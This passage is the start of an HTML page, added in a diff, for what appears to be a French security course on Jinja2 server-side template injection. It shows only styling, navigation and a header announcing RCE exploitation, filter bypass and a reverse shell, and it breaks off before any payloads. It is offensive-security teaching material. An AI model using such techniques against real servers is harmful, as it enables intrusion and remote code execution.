@@ -1,0 +1,1461 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<title>SSTI Jinja2 — Server-Side Template Injection | SPECTRA MZ</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
+
+  :root {
+    --bg:        #080c18;
+    --surface:   #0f1525;
+    --surface2:  #151d30;
+    --border:    #1e2a42;
+    --cyan:      #00d4aa;
+    --cyan-dim:  #00d4aa22;
+    --cyan-glow: #00d4aa44;
+    --red:       #ff4757;
+    --amber:     #ffa502;
+    --purple:    #a855f7;
+    --blue:      #2f9bff;
+    --green:     #4ade80;
+    --text:      #e2e8f4;
+    --muted:     #7a8aab;
+    --code-bg:   #060a14;
+    --safe-t: env(safe-area-inset-top, 0px);
+    --safe-b: env(safe-area-inset-bottom, 0px);
+    --safe-l: env(safe-area-inset-left, 0px);
+    --safe-r: env(safe-area-inset-right, 0px);
+  }
+
+  html { scroll-behavior: smooth; -webkit-text-size-adjust: 100%; text-size-adjust: 100%; }
+
+  body {
+    background: var(--bg); color: var(--text);
+    font-family: 'Inter', sans-serif; font-size: 16px; line-height: 1.7;
+    overflow-x: hidden; -webkit-font-smoothing: antialiased;
+  }
+
+  body::before {
+    content: ''; position: fixed; inset: 0;
+    background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,.08) 2px, rgba(0,0,0,.08) 4px);
+    pointer-events: none; z-index: 9999;
+  }
+
+  img { max-width: 100%; height: auto; display: block; }
+
+  .progress-bar { position: fixed; top: 0; left: 0; right: 0; height: 3px; z-index: 700; background: var(--border); }
+  .progress-fill { height: 100%; width: 0%; max-width: 100%; background: linear-gradient(90deg, var(--cyan), var(--blue)); box-shadow: 0 0 8px var(--cyan-glow); transition: width .1s linear; }
+
+  .back-home {
+    position: fixed; top: calc(1.2rem + var(--safe-t)); left: calc(1.2rem + var(--safe-l)); z-index: 600;
+    display: inline-flex; align-items: center; gap: .5rem; padding: .6rem 1.05rem; min-height: 44px;
+    background: rgba(15,21,37,.9); -webkit-backdrop-filter: blur(10px); backdrop-filter: blur(10px);
+    border: 1px solid var(--border); border-radius: 8px;
+    font-family: 'JetBrains Mono', monospace; font-size: .78rem; font-weight: 500; color: var(--muted);
+    text-decoration: none; transition: all .2s;
+  }
+  .back-home:hover, .back-home:active { border-color: var(--cyan); color: var(--cyan); box-shadow: 0 0 16px var(--cyan-glow); }
+  .back-home svg { width: 14px; height: 14px; flex-shrink: 0; }
+
+  .sidebar {
+    position: fixed; left: 0; top: 0; width: 64px; height: 100vh;
+    display: flex; flex-direction: column; align-items: center; justify-content: center;
+    z-index: 100; padding: 2rem 0;
+  }
+  .sidebar-line { width: 1px; flex: 1; background: var(--border); }
+  .phase-dot {
+    width: 32px; height: 32px; border-radius: 50%; border: 1px solid var(--border); background: var(--surface);
+    display: flex; align-items: center; justify-content: center;
+    font-family: 'JetBrains Mono', monospace; font-size: 9px; color: var(--muted);
+    cursor: pointer; transition: all .3s; text-decoration: none; flex-shrink: 0;
+  }
+  .phase-dot:hover, .phase-dot.active { border-color: var(--cyan); color: var(--cyan); box-shadow: 0 0 12px var(--cyan-glow); background: var(--cyan-dim); }
+
+  .mobile-nav {
+    display: none; position: fixed; bottom: 0; left: 0; right: 0; z-index: 650;
+    background: rgba(15,21,37,.95); -webkit-backdrop-filter: blur(14px); backdrop-filter: blur(14px);
+    border-top: 1px solid var(--border);
+    padding: .6rem calc(.6rem + var(--safe-l)) calc(.6rem + var(--safe-b)) calc(.6rem + var(--safe-r));
+  }
+  .mobile-nav-scroll { display: flex; gap: .5rem; overflow-x: auto; scrollbar-width: none; -ms-overflow-style: none; }
+  .mobile-nav-scroll::-webkit-scrollbar { display: none; }
+  .mobile-nav-item {
+    flex-shrink: 0; display: flex; align-items: center; justify-content: center;
+    min-width: 44px; min-height: 44px; border-radius: 8px; border: 1px solid var(--border); background: var(--surface);
+    font-family: 'JetBrains Mono', monospace; font-size: .66rem; color: var(--muted); text-decoration: none; transition: all .2s;
+  }
+  .mobile-nav-item.active { border-color: var(--cyan); color: var(--cyan); background: var(--cyan-dim); }
+
+  main { margin-left: 64px; width: calc(100% - 64px); padding: 0 2rem 6rem; }
+  .inner { max-width: 920px; margin: 0 auto; }
+
+  .hero { padding: calc(5.5rem + var(--safe-t)) 0 4rem; position: relative; }
+  .hero-eyebrow {
+    font-family: 'JetBrains Mono', monospace; font-size: 11px; letter-spacing: .18em; text-transform: uppercase;
+    color: var(--cyan); margin-bottom: 1.5rem; display: flex; align-items: center; gap: .75rem; flex-wrap: wrap;
+  }
+  .hero-eyebrow::before { content:''; display:inline-block; width:24px; height:1px; background: var(--cyan); }
+
+  .hero-title {
+    font-family: 'JetBrains Mono', monospace; font-size: clamp(1.9rem, 5.4vw, 3.3rem);
+    font-weight: 700; line-height: 1.15; letter-spacing: -.02em; margin-bottom: 1rem; word-break: break-word;
+  }
+  .hero-title .accent { color: var(--cyan); }
+  .hero-title .dim { color: var(--muted); font-weight: 300; }
+
+  .hero-sub { font-size: clamp(.95rem, 2.2vw, 1.05rem); color: var(--muted); margin-bottom: 2.5rem; max-width: 640px; }
+
+  .meta-pills { display: flex; flex-wrap: wrap; gap: .6rem; margin-bottom: 2rem; }
+  .pill { padding: .35rem .9rem; border-radius: 99px; font-family: 'JetBrains Mono', monospace; font-size: 11px; letter-spacing: .08em; font-weight: 500; white-space: nowrap; }
+  .pill-cyan   { border:1px solid var(--cyan);   color:var(--cyan);   background:var(--cyan-dim); }
+  .pill-red    { border:1px solid var(--red);    color:var(--red);    background:#ff475711; }
+  .pill-amber  { border:1px solid var(--amber);  color:var(--amber);  background:#ffa50211; }
+  .pill-purple { border:1px solid var(--purple); color:var(--purple); background:#a855f711; }
+  .pill-green  { border:1px solid var(--green);  color:var(--green);  background:#4ade8011; }
+
+  .hero-divider { width: 100%; height: 1px; background: linear-gradient(90deg, var(--cyan) 0%, var(--border) 60%, transparent 100%); margin-top: 3rem; }
+
+  .publish-date {
+    display: inline-flex; align-items: center; gap: .45rem;
+    font-family: 'JetBrains Mono', monospace; font-size: .75rem; color: var(--muted);
+    margin-bottom: 1.6rem;
+  }
+  .publish-date svg { width: 13px; height: 13px; color: var(--cyan); flex-shrink: 0; }
+
+  .share-section { margin-top: 1.8rem; }
+  .share-label { font-family: 'JetBrains Mono', monospace; font-size: .7rem; letter-spacing: .15em; text-transform: uppercase; color: var(--muted); margin-bottom: .7rem; }
+  .share-bar { display: flex; flex-wrap: wrap; gap: .6rem; }
+  .share-btn {
+    width: 40px; height: 40px; border-radius: 8px; border: 1px solid var(--border);
+    background: var(--surface); display: flex; align-items: center; justify-content: center;
+    color: var(--muted); transition: all .2s; cursor: pointer; text-decoration: none;
+    flex-shrink: 0;
+  }
+  .share-btn:hover, .share-btn:active { border-color: var(--cyan); color: var(--cyan); box-shadow: 0 0 12px var(--cyan-glow); transform: translateY(-1px); }
+  .share-btn svg { width: 17px; height: 17px; }
+  .share-btn.copied { border-color: var(--cyan); color: var(--cyan); }
+
+  .toc { background: var(--surface); border: 1px solid var(--border); border-radius: 10px; padding: 1.5rem 1.6rem; margin: 2rem 0; }
+  .toc-title { font-family: 'JetBrains Mono', monospace; font-size: .75rem; letter-spacing: .15em; text-transform: uppercase; color: var(--cyan); margin-bottom: 1rem; }
+  .toc-list { list-style: none; display: grid; grid-template-columns: 1fr 1fr; gap: .6rem 1.5rem; }
+  .toc-list a { font-size: .85rem; color: #b8c3d9; text-decoration: none; display: flex; align-items: baseline; gap: .5rem; transition: color .2s; min-height: 24px; }
+  .toc-list a:hover, .toc-list a:active { color: var(--cyan); }
+  .toc-num { font-family: 'JetBrains Mono', monospace; font-size: .7rem; color: var(--muted); flex-shrink: 0; }
+
+  .section { padding: 3.5rem 0 2rem; border-bottom: 1px solid var(--border); }
+  .section:last-of-type { border-bottom: none; }
+
+  .section-label { font-family: 'JetBrains Mono', monospace; font-size: 10px; letter-spacing: .2em; text-transform: uppercase; color: var(--cyan); margin-bottom: .6rem; display: flex; align-items: center; gap: .5rem; }
+  .section-label span { color: var(--muted); }
+  .section-title { font-family: 'JetBrains Mono', monospace; font-size: clamp(1.2rem, 3.2vw, 1.5rem); font-weight: 600; color: var(--text); margin-bottom: 1.5rem; line-height: 1.3; }
+  .subsection-title { font-family: 'JetBrains Mono', monospace; font-size: 1rem; font-weight: 600; color: var(--cyan); margin: 2.2rem 0 .9rem; padding-left: 1rem; border-left: 2px solid var(--cyan); }
+
+  p { margin-bottom: 1.1rem; color: #b8c3d9; word-wrap: break-word; }
+  p strong { color: var(--text); font-weight: 600; }
+  ul.plain, ol.plain { margin: 0 0 1.1rem 1.3rem; color: #b8c3d9; }
+  ul.plain li, ol.plain li { margin-bottom: .5rem; }
+
+  .def-box { background: linear-gradient(135deg, #2f9bff0a 0%, #2f9bff03 100%); border: 1px solid var(--blue); border-radius: 10px; padding: 1.3rem 1.4rem; margin: 1.2rem 0 1.6rem; }
+  .def-term { display: flex; align-items: center; gap: .6rem; font-family: 'JetBrains Mono', monospace; font-size: .92rem; font-weight: 700; color: var(--blue); margin-bottom: .5rem; flex-wrap: wrap; }
+  .def-term::before { content: '§'; font-size: 1.1rem; }
+  .def-body { color: #b8c3d9; font-size: .88rem; }
+  .def-body code { background: var(--surface2); border: 1px solid var(--border); border-radius: 4px; padding: .1em .4em; color: #c0cce8; font-size: .85em; word-break: break-all; }
+
+  /* ── TERMINAL FRAME (images) ── */
+  .terminal-frame { background: var(--surface); border: 1px solid var(--border); border-radius: 10px; overflow: hidden; margin: 1.5rem 0; box-shadow: 0 8px 40px rgba(0,0,0,.5), 0 0 0 1px rgba(0,212,170,.06); }
+  .terminal-bar { background: var(--surface2); padding: .6rem .9rem; display: flex; align-items: center; gap: .5rem; border-bottom: 1px solid var(--border); flex-wrap: wrap; }
+  .t-dot { width: 10px; height: 10px; border-radius: 50%; flex-shrink: 0; }
+  .t-dot-red { background: #ff5f57; } .t-dot-amber { background: #ffbd2e; } .t-dot-green { background: #28c840; }
+  .terminal-bar-label { font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--muted); margin-left: .3rem; word-break: break-all; }
+  .terminal-frame .img-scroll { overflow-x: auto; -webkit-overflow-scrolling: touch; background: #000; }
+  .terminal-frame img { width: 100%; display: block; vertical-align: top; }
+  .terminal-caption { padding: .6rem .9rem; font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--muted); background: var(--surface2); border-top: 1px solid var(--border); display: flex; align-items: flex-start; gap: .5rem; }
+  .terminal-caption::before { content: '▸'; color: var(--cyan); flex-shrink: 0; }
+
+  .code-wrap { background: var(--code-bg); border: 1px solid var(--border); border-radius: 8px; overflow: hidden; margin: 1rem 0 1.5rem; position: relative; }
+  .code-header { background: var(--surface2); padding: .45rem .9rem; display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid var(--border); gap: .5rem; }
+  .code-lang { font-family: 'JetBrains Mono', monospace; font-size: 10px; letter-spacing: .1em; text-transform: uppercase; color: var(--cyan); overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+  .code-file { font-family: 'JetBrains Mono', monospace; font-size: 10px; color: var(--muted); }
+  .copy-btn { background: none; border: 1px solid var(--border); color: var(--muted); font-family: 'JetBrains Mono', monospace; font-size: 10px; padding: .35rem .7rem; border-radius: 4px; cursor: pointer; transition: all .2s; min-height: 32px; flex-shrink: 0; }
+  .copy-btn:hover, .copy-btn:active { border-color: var(--cyan); color: var(--cyan); }
+  .code-wrap pre { padding: 1.1rem 1.1rem; overflow-x: auto; -webkit-overflow-scrolling: touch; font-family: 'JetBrains Mono', monospace; font-size: .78rem; line-height: 1.7; color: #c0cce8; }
+  .code-wrap pre .kw { color: var(--cyan); }
+  .code-wrap pre .fn { color: var(--green); }
+  .code-wrap pre .str { color: #ffdd87; }
+  .code-wrap pre .cm { color: var(--muted); font-style: italic; }
+  .code-wrap pre .num { color: var(--purple); }
+  .code-wrap pre .var { color: var(--blue); }
+  .code-wrap pre .cls { color: var(--amber); }
+  .code-wrap pre .op { color: var(--cyan); }
+  .code-wrap pre .payload { color: var(--red); font-weight: 500; }
+  .code-wrap pre .good { color: var(--green); font-weight: 500; }
+  .code-wrap pre .muted { color: var(--muted); }
+
+  .result-badge { display: inline-flex; align-items: flex-start; gap: .5rem; background: #00d4aa0f; border: 1px solid var(--cyan); border-radius: 6px; padding: .6rem 1rem; font-family: 'JetBrains Mono', monospace; font-size: .8rem; color: var(--cyan); margin: .5rem 0 1rem; word-break: break-word; }
+  .result-badge::before { content: '✓'; font-weight: 700; flex-shrink: 0; }
+  .warn-badge { display: inline-flex; align-items: flex-start; gap: .5rem; background: #ffa5020f; border: 1px solid var(--amber); border-radius: 6px; padding: .6rem 1rem; font-family: 'JetBrains Mono', monospace; font-size: .8rem; color: var(--amber); margin: .5rem 0 1rem; }
+  .warn-badge::before { content: '⚠'; font-weight: 700; flex-shrink: 0; }
+  .blocked-badge { display: inline-flex; align-items: flex-start; gap: .5rem; background: #ff47570f; border: 1px solid var(--red); border-radius: 6px; padding: .6rem 1rem; font-family: 'JetBrains Mono', monospace; font-size: .8rem; color: var(--red); margin: .5rem 0 1rem; }
+  .blocked-badge::before { content: '✗'; font-weight: 700; flex-shrink: 0; }
+
+  .table-wrap { overflow-x: auto; -webkit-overflow-scrolling: touch; margin: 1.2rem 0 1.8rem; border-radius: 8px; border: 1px solid var(--border); }
+  table { width: 100%; border-collapse: collapse; font-size: .82rem; min-width: 480px; }
+  thead tr { background: var(--surface2); }
+  thead th { padding: .7rem .9rem; text-align: left; font-family: 'JetBrains Mono', monospace; font-size: .7rem; letter-spacing: .08em; text-transform: uppercase; color: var(--cyan); font-weight: 500; border-bottom: 1px solid var(--border); white-space: nowrap; }
+  tbody tr { border-bottom: 1px solid var(--border); transition: background .15s; }
+  tbody tr:last-child { border-bottom: none; }
+  tbody tr:hover { background: var(--surface); }
+  tbody td { padding: .7rem .9rem; color: #b8c3d9; vertical-align: top; }
+  td code, p code, li code { font-family: 'JetBrains Mono', monospace; font-size: .82em; background: var(--surface2); border: 1px solid var(--border); border-radius: 4px; padding: .1em .4em; color: #c0cce8; word-break: break-all; }
+
+  .chain { display: flex; flex-wrap: wrap; align-items: center; gap: .4rem; background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 1.1rem 1.2rem; margin: 1rem 0 1.5rem; }
+  .chain-node { font-family: 'JetBrains Mono', monospace; font-size: .74rem; color: var(--text); background: var(--surface2); border: 1px solid var(--border); border-radius: 5px; padding: .35rem .65rem; word-break: break-all; }
+  .chain-arrow { font-family: 'JetBrains Mono', monospace; font-size: .9rem; color: var(--cyan); flex-shrink: 0; }
+  .chain-node.highlight { border-color: var(--cyan); color: var(--cyan); background: var(--cyan-dim); }
+  .chain-node.danger { border-color: var(--red); color: var(--red); background: #ff475711; }
+
+  .diagram { background: var(--surface); border: 1px solid var(--border); border-radius: 10px; padding: 1.5rem; margin: 1.5rem 0; overflow-x: auto; }
+  .diagram pre { font-family: 'JetBrains Mono', monospace; font-size: .78rem; line-height: 1.6; color: #c0cce8; background: transparent; border: none; padding: 0; margin: 0; white-space: pre; }
+  .d-accent { color: var(--cyan); }
+  .d-red { color: var(--red); }
+  .d-green { color: var(--green); }
+
+  .steps { margin: 1.5rem 0; }
+  .step { display: flex; gap: 1.1rem; margin-bottom: 2rem; }
+  .step-num {
+    width: 28px; height: 28px; min-width: 28px;
+    border: 1px solid var(--cyan); border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+    font-family: 'JetBrains Mono', monospace; font-size: .7rem; color: var(--cyan);
+    margin-top: .25rem; background: var(--cyan-dim);
+  }
+  .step-body { flex: 1; min-width: 0; }
+  .step-body h4 { font-family: 'JetBrains Mono', monospace; font-size: .92rem; font-weight: 600; color: var(--text); margin-bottom: .5rem; }
+  .step-body p { margin-bottom: .5rem; }
+  .step-body .code-wrap { margin: .8rem 0; }
+  .step-body .terminal-frame { margin: .8rem 0; }
+
+  .callout { background: linear-gradient(135deg, #2f9bff0a 0%, #2f9bff03 100%); border: 1px solid var(--blue); border-radius: 10px; padding: 1.2rem 1.4rem; margin: 1.2rem 0 1.6rem; }
+  .callout-title { font-family: 'JetBrains Mono', monospace; font-size: .8rem; font-weight: 700; margin-bottom: .5rem; letter-spacing: .05em; color: var(--blue); }
+  .callout p { margin-bottom: 0; font-size: .88rem; }
+  .callout-info { border-color: var(--blue); background: linear-gradient(135deg, #2f9bff0a 0%, #2f9bff03 100%); }
+  .callout-info .callout-title { color: var(--blue); }
+  .callout-warn { border-color: var(--amber); background: linear-gradient(135deg, #ffa5020a 0%, #ffa50203 100%); }
+  .callout-warn .callout-title { color: var(--amber); }
+  .callout-danger { border-color: var(--red); background: linear-gradient(135deg, #ff47570a 0%, #ff475703 100%); }
+  .callout-danger .callout-title { color: var(--red); }
+  .callout-success { border-color: var(--green); background: linear-gradient(135deg, #4ade800a 0%, #4ade8003 100%); }
+  .callout-success .callout-title { color: var(--green); }
+
+  blockquote { background: #ff475709; border-left: 3px solid var(--red); border-radius: 0 6px 6px 0; padding: .9rem 1.1rem; margin: 1rem 0; font-family: 'JetBrains Mono', monospace; font-size: .82rem; color: var(--red); word-break: break-word; }
+
+  .ref-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr)); gap: .8rem; margin-top: 1rem; }
+  .ref-card { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 1rem; text-decoration: none; display: flex; flex-direction: column; gap: .3rem; transition: border-color .2s, box-shadow .2s; min-height: 44px; }
+  .ref-card:hover, .ref-card:active { border-color: var(--cyan); box-shadow: 0 0 20px var(--cyan-glow); }
+  .ref-icon { font-size: 1.1rem; margin-bottom: .2rem; }
+  .ref-name { font-family: 'JetBrains Mono', monospace; font-size: .78rem; color: var(--cyan); font-weight: 600; }
+  .ref-url { font-size: .73rem; color: var(--muted); overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+
+  .flag-box { background: linear-gradient(135deg, #00d4aa0a 0%, #00d4aa03 100%); border: 1px solid var(--cyan); border-radius: 10px; padding: 1.6rem 1.4rem; text-align: center; position: relative; overflow: hidden; margin: 1.5rem 0; }
+  .flag-box::before { content: ''; position: absolute; inset: 0; background: radial-gradient(ellipse at 50% 0%, var(--cyan-glow) 0%, transparent 70%); pointer-events: none; }
+  .flag-label { font-family: 'JetBrains Mono', monospace; font-size: 10px; letter-spacing: .2em; text-transform: uppercase; color: var(--muted); margin-bottom: .8rem; }
+  .flag-text { font-family: 'JetBrains Mono', monospace; font-size: clamp(.9rem, 3.2vw, 1.2rem); font-weight: 700; color: var(--cyan); letter-spacing: .02em; text-shadow: 0 0 20px var(--cyan-glow); word-break: break-all; }
+
+  footer { margin-top: 4rem; padding: 2rem 0; border-top: 1px solid var(--border); display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 1rem; }
+  .footer-author { font-family: 'JetBrains Mono', monospace; font-size: .78rem; color: var(--muted); line-height: 1.8; }
+  .footer-author a { color: var(--cyan); text-decoration: none; }
+  .footer-author a:hover { text-decoration: underline; }
+  .footer-badge { font-family: 'JetBrains Mono', monospace; font-size: .72rem; color: var(--muted); display: flex; align-items: center; gap: .4rem; }
+  .footer-badge span { color: var(--cyan); }
+
+  .bottom-back { display: inline-flex; align-items: center; gap: .5rem; padding: .7rem 1.2rem; margin-top: .8rem; min-height: 44px; border: 1px solid var(--cyan); border-radius: 8px; color: var(--cyan); text-decoration: none; font-family: 'JetBrains Mono', monospace; font-size: .8rem; background: var(--cyan-dim); transition: all .2s; }
+  .bottom-back:hover, .bottom-back:active { box-shadow: 0 0 20px var(--cyan-glow); }
+
+  ::-webkit-scrollbar { width: 6px; height: 6px; }
+  ::-webkit-scrollbar-track { background: var(--bg); }
+  ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+  ::-webkit-scrollbar-thumb:hover { background: var(--muted); }
+
+  a:focus-visible, button:focus-visible { outline: 2px solid var(--cyan); outline-offset: 2px; }
+  @media (prefers-reduced-motion: reduce) {
+    *, *::before, *::after { transition-duration: 0.01ms !important; animation-duration: 0.01ms !important; scroll-behavior: auto !important; }
+    html { scroll-behavior: auto; }
+  }
+
+  @media (max-width: 900px) {
+    main { margin-left: 0; width: 100%; padding: 0 1.6rem 6rem; }
+    .sidebar { display: none; }
+    .mobile-nav { display: block; }
+  }
+  @media (max-width: 768px) {
+    .hero { padding: calc(4.5rem + var(--safe-t)) 0 3rem; }
+    .toc-list { grid-template-columns: 1fr; }
+    .ref-grid { grid-template-columns: repeat(auto-fit, minmax(160px, 1fr)); }
+  }
+  @media (max-width: 480px) {
+    body { font-size: 15px; }
+    main { padding: 0 1.1rem 6rem; }
+    .hero { padding: calc(4rem + var(--safe-t)) 0 2.5rem; }
+    .back-home { font-size: .72rem; padding: .5rem .8rem; }
+    .back-home span.label { display: none; }
+    .section { padding: 2.6rem 0 1.5rem; }
+    .section-title { margin-bottom: 1.1rem; }
+    .subsection-title { margin: 1.8rem 0 .7rem; font-size: .92rem; }
+    .code-wrap pre { font-size: .7rem; padding: .9rem .8rem; }
+    .def-box, .toc { padding: 1rem 1.1rem; }
+    .flag-box { padding: 1.3rem 1rem; }
+    .chain { padding: .9rem 1rem; gap: .35rem; }
+    .chain-node { font-size: .7rem; padding: .3rem .55rem; }
+    footer { flex-direction: column; align-items: flex-start; }
+    .share-btn { width: 38px; height: 38px; }
+  }
+  @media (max-height: 480px) and (orientation: landscape) {
+    .mobile-nav { padding-bottom: calc(.4rem + var(--safe-b)); }
+    .mobile-nav-item { min-height: 36px; }
+  }
+  @media (min-width: 1400px) { .inner { max-width: 1020px; } }
+</style>
+</head>
+<body>
+
+<div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
+
+<a class="back-home" href="../index.html">
+  <svg viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M9.5 3L4.5 8L9.5 13"/></svg>
+  <span class="label">Retour à l'accueil</span>
+</a>
+
+<nav class="sidebar">
+  <div class="sidebar-line"></div>
+  <a class="phase-dot" href="#s0" title="Intro">00</a>
+  <div class="sidebar-line"></div>
+  <a class="phase-dot" href="#s1" title="Théorie">01</a>
+  <div class="sidebar-line"></div>
+  <a class="phase-dot" href="#s2" title="Jinja2">02</a>
+  <div class="sidebar-line"></div>
+  <a class="phase-dot" href="#s3" title="Détection">03</a>
+  <div class="sidebar-line"></div>
+  <a class="phase-dot" href="#s4" title="Exploitation">04</a>
+  <div class="sidebar-line"></div>
+  <a class="phase-dot" href="#s5" title="Bypass">05</a>
+  <div class="sidebar-line"></div>
+  <a class="phase-dot" href="#s6" title="Lab">06</a>
+  <div class="sidebar-line"></div>
+  <a class="phase-dot" href="#s7" title="Ressources">07</a>
+  <div class="sidebar-line"></div>
+</nav>
+
+<nav class="mobile-nav">
+  <div class="mobile-nav-scroll">
+    <a class="mobile-nav-item" href="#s0">00</a>
+    <a class="mobile-nav-item" href="#s1">01</a>
+    <a class="mobile-nav-item" href="#s2">02</a>
+    <a class="mobile-nav-item" href="#s3">03</a>
+    <a class="mobile-nav-item" href="#s4">04</a>
+    <a class="mobile-nav-item" href="#s5">05</a>
+    <a class="mobile-nav-item" href="#s6">06</a>
+    <a class="mobile-nav-item" href="#s7">07</a>
+  </div>
+</nav>
+
+<main>
+<div class="inner">
+
+  <header class="hero">
+    <div class="hero-eyebrow">Security Research · Web Exploitation · Cours Technique Complet</div>
+    <h1 class="hero-title">
+      Server-Side Template<br>
+      <span class="accent">Injection</span><br>
+      <span class="dim" style="font-size:58%;">Jinja2 — de la théorie à l'exploitation RCE</span>
+    </h1>
+    <p class="hero-sub">
+      Comprendre comment un moteur de template devient une surface d'attaque critique :
+      anatomie de Jinja2, détection, exploitation RCE via introspection Python,
+      bypass de filtres, reverse shell, et lab pratique complet documenté par captures.
+    </p>
+    <div class="meta-pills">
+      <span class="pill pill-red">SSTI</span>
+      <span class="pill pill-green">Python / Jinja2</span>
+      <span class="pill pill-amber">Intermédiaire</span>
+      <span class="pill pill-cyan">RCE</span>
+      <span class="pill pill-purple">CTF / Pentest</span>
+    </div>
+    <div class="publish-date">
+      <svg viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.5"><rect x="2" y="3" width="12" height="11" rx="1.5"/><path d="M2 6.5h12M5 1.5v3M11 1.5v3"/></svg>
+      Publié en 2026 · SPECTRA MZ
+    </div>
+    <div class="hero-divider"></div>
+    <div class="share-section">
+      <div class="share-label">Partager cet article</div>
+      <div class="share-bar">
+        <a class="share-btn" id="shareTwitter" href="#" target="_blank" rel="noopener" title="Partager sur X / Twitter">
+          <svg viewBox="0 0 24 24" fill="currentColor"><path d="M18.9 1.9h3.7l-8.1 9.3L24 22.1h-7.5l-5.9-7.7-6.7 7.7H0.2l8.7-9.9L0 1.9h7.7l5.3 7.1zM17.6 19.9h2L6.5 4h-2.1z"/></svg>
+        </a>
+        <a class="share-btn" id="shareLinkedin" href="#" target="_blank" rel="noopener" title="Partager sur LinkedIn">
+          <svg viewBox="0 0 24 24" fill="currentColor"><path d="M20.4 20.4h-3.6v-5.6c0-1.3 0-3-1.9-3s-2.1 1.4-2.1 2.9v5.7H9.2V9h3.4v1.6h.1c.5-.9 1.7-1.9 3.4-1.9 3.6 0 4.3 2.4 4.3 5.5v6.2zM5.3 7.4a2.1 2.1 0 110-4.2 2.1 2.1 0 010 4.2zM7.1 20.4H3.6V9h3.5v11.4z"/></svg>
+        </a>
+        <a class="share-btn" id="shareFacebook" href="#" target="_blank" rel="noopener" title="Partager sur Facebook">
+          <svg viewBox="0 0 24 24" fill="currentColor"><path d="M22 12.06C22 6.5 17.5 2 12 2S2 6.5 2 12.06c0 5 3.66 9.15 8.44 9.94v-7.03H7.9v-2.9h2.54V9.85c0-2.5 1.5-3.89 3.78-3.89 1.1 0 2.24.2 2.24.2v2.46h-1.26c-1.24 0-1.63.77-1.63 1.56v1.88h2.78l-.44 2.9h-2.34V22c4.78-.8 8.44-4.95 8.44-9.94z"/></svg>
+        </a>
+        <a class="share-btn" id="shareWhatsapp" href="#" target="_blank" rel="noopener" title="Partager sur WhatsApp">
+          <svg viewBox="0 0 24 24" fill="currentColor"><path d="M17.5 14.4c-.3-.1-1.7-.9-2-1-.3-.1-.5-.1-.7.1-.2.3-.8 1-.9 1.2-.2.2-.3.2-.6.1-.3-.2-1.3-.5-2.4-1.5-.9-.8-1.5-1.8-1.7-2.1-.2-.3 0-.5.1-.6.1-.1.3-.3.4-.5.1-.1.2-.3.3-.5.1-.2 0-.4 0-.5C10 9 9.4 7.6 9.1 7c-.2-.5-.4-.5-.6-.5h-.5c-.2 0-.5.1-.7.3-.3.3-1 1-1 2.4s1 2.8 1.2 3c.1.2 2 3.1 4.9 4.3.7.3 1.2.5 1.7.6.7.2 1.3.2 1.8.1.6-.1 1.7-.7 1.9-1.3.2-.7.2-1.2.2-1.3-.1-.2-.3-.3-.6-.4z"/><path d="M12 2a10 10 0 00-8.5 15.2L2 22l4.9-1.3A10 10 0 1012 2zm0 18.3a8.3 8.3 0 01-4.2-1.2l-.3-.2-3.1.8.8-3-.2-.3A8.3 8.3 0 1112 20.3z"/></svg>
+        </a>
+        <a class="share-btn" id="shareTelegram" href="#" target="_blank" rel="noopener" title="Partager sur Telegram">
+          <svg viewBox="0 0 24 24" fill="currentColor"><path d="M22 4.3l-3.1 15c-.2 1-.9 1.2-1.7.8l-4.8-3.6-2.3 2.2c-.3.3-.5.5-.9.5l.3-4.7 8.7-7.8c.4-.3-.1-.5-.6-.2L6.3 12.6l-4.6-1.5c-1-.3-1-1 .2-1.4L20.6 2.9c.8-.3 1.6.2 1.4 1.4z"/></svg>
+        </a>
+        <a class="share-btn" id="shareReddit" href="#" target="_blank" rel="noopener" title="Partager sur Reddit">
+          <svg viewBox="0 0 24 24" fill="currentColor"><path d="M22 12c0-1.1-.9-2-2-2-.5 0-1 .2-1.4.5-1.3-.9-3.1-1.5-5.1-1.6l1-4.5 3.2.7c0 .8.7 1.4 1.5 1.4.8 0 1.5-.7 1.5-1.5S20 3.5 19.2 3.5c-.6 0-1.1.3-1.3.9l-3.5-.8c-.2 0-.3.1-.4.2l-1.1 5c-2 .1-3.8.7-5.1 1.6-.4-.3-.9-.5-1.4-.5-1.1 0-2 .9-2 2 0 .8.5 1.5 1.1 1.8-.1.3-.1.5-.1.8 0 2.7 3.2 5 7.2 5s7.2-2.2 7.2-5c0-.3 0-.6-.1-.8.6-.3 1.1-1 1.1-1.8zM8 13.5c0-.6.5-1 1-1s1 .4 1 1-.5 1-1 1-1-.4-1-1zm7.5 3.5c-.8.8-2 1.1-3.5 1.1s-2.7-.3-3.5-1.1c-.1-.1-.1-.3 0-.4.1-.1.3-.1.4 0 .6.6 1.7.9 3 .9s2.4-.3 3-.9c.1-.1.3-.1.4 0 .2.1.2.3.2.4zm-.3-2.5c-.5 0-1-.4-1-1s.5-1 1-1 1 .4 1 1-.5 1-1 1z"/></svg>
+        </a>
+        <button class="share-btn" id="copyLinkBtn" title="Copier le lien">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M10 13a5 5 0 007.1 0l2-2a5 5 0 00-7-7l-1 1"/><path d="M14 11a5 5 0 00-7.1 0l-2 2a5 5 0 007 7l1-1"/></svg>
+        </button>
